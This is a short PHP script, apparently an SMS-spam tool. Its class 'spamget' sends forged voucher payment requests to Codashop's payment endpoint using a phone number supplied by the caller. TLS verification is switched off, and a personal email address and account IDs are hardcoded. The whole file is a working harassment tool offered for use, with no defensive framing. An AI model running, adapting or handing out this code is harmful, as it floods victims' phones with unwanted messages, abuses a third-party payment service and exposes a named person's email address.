<?php

class spamget{


 public function spam($no)
    
    {   
        $curl = curl_init();
        curl_setopt_array($curl, array(
        CURLOPT_URL => "https://order.codashop.com/id/initPayment.action",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => "",
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_SSL_VERIFYPEER => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => "POST",
        CURLOPT_POST => 1,
        CURLOPT_POSTFIELDS => "voucherPricePoint.id=1455&voucherPricePoint.price=30000&voucherPricePoint.variablePrice=0&email=nandzquin@gmail.com&n=16/04/2020-133&userVariablePrice=0&msisdn=$no&order.data.profile=eyJuYW1lIjoiIiwiaWRfbm8iOiIifQ==&user.userId=84333399&user.zoneId=2165&voucherTypeName=MOBILE_LEGENDS&affiliateTrackingId=",
        CURLOPT_HTTPHEADER => array(
            "Host: order.codashop.com",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0",
            "Accept: text/plain, */*; q=0.01",
            "Accept-Language: en-GB,en;q=0.5",
            "Accept-Encoding: gzip, deflate, br",
            "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
            "Content-Length: 324",
            "Origin: https://www.codashop.com",
            "Connection: keep-alive",
            "Referer: https://www.codashop.com/id/mobile-legends",),
        )
    );

        $response = curl_exec($curl);
        return $response;

    }
}
    ?>